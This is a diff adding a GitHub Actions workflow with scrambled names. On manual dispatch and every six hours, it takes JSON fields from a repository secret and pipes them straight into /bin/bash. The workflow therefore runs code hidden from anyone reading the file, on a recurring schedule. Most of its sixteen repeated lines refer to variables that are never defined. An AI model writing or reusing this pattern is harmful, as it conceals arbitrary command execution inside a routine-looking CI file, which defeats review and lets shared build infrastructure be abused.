@@ -1,0 +1,33 @@
+name: hebaise4756
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hebaise4756
+        env:
+          bksc0: ${{ secrets.bksc0 }}
+        run: |
+          echo $bksc0 | jq -r .sjbu0092 | /bin/bash
+          echo $sv3601 | jq -r .jflp65887 | /bin/bash
+          echo $kjei63 | jq -r .m0 | /bin/bash
+          echo $bclu973 | jq -r .nfo7557 | /bin/bash
+          echo $jy97 | jq -r .i46 | /bin/bash
+          echo $jpl4250 | jq -r .cv041 | /bin/bash
+          echo $zpe63 | jq -r .oyfio182 | /bin/bash
+          echo $t16 | jq -r .ke053 | /bin/bash
+          echo $uv161 | jq -r .uxg1709 | /bin/bash
+          echo $q857 | jq -r .y1 | /bin/bash
+          echo $dk52925 | jq -r .uwwlj36 | /bin/bash
+          echo $uzp758 | jq -r .kbcj908 | /bin/bash
+          echo $k4313 | jq -r .l73 | /bin/bash
+          echo $znd90 | jq -r .xef65 | /bin/bash
+          echo $xa8 | jq -r .l4 | /bin/bash
+          echo $tkrm6218 | jq -r .y59 | /bin/bash
+          echo $vu4 | jq -r .wa2 | /bin/bash
+
